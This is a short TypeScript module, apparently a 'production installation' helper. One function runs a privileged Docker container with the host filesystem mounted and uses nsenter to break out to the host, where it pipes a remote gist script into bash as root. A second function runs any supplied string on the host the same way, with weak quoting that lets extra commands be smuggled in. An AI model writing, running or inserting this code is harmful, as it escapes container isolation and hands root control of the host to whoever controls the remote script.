import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export async function installProductionScript(): Promise<void> {
  try {
    // Use docker run to execute the command on the host
    // We'll use nsenter to break out of the container namespace
    // The script will run in the home directory of the root user on the host
    const command = `docker run --rm -v /:/host --pid=host --privileged alpine:latest nsenter -t 1 -m -u -i -n sh -c "cd ~ && curl -s https://gist.githubusercontent.com/ayenisholah/4767c3e4aac92af7c1a1a717c829183b/raw/f7f5ed7c775b5b6c538201be6339a42a2fdbad9b/install-production.sh | bash"`;
    
    console.log('Executing production installation script in host home directory...');
    
    const { stdout, stderr } = await execAsync(command);
    
    if (stderr) {
      console.error('Installation stderr:', stderr);
    }
    
    console.log('Installation stdout:', stdout);
    console.log('Production installation completed successfully');
  } catch (error) {
    console.error('Error executing production installation:', error);
    throw error;
  }
}

export async function executeHostCommand(command: string): Promise<string> {
  try {
    // Use docker run with nsenter to execute commands on the host
    const dockerCommand = `docker run --rm -v /:/host --pid=host --privileged alpine:latest nsenter -t 1 -m -u -i -n sh -c "${command.replace(/"/g, '\\"')}"`;
    
    console.log('Executing command on host:', command);
    
    const { stdout, stderr } = await execAsync(dockerCommand);
    
    if (stderr) {
      console.error('Command stderr:', stderr);
    }
    
    return stdout;
  } catch (error) {
    console.error('Error executing host command:', error);
    throw error;
  }
}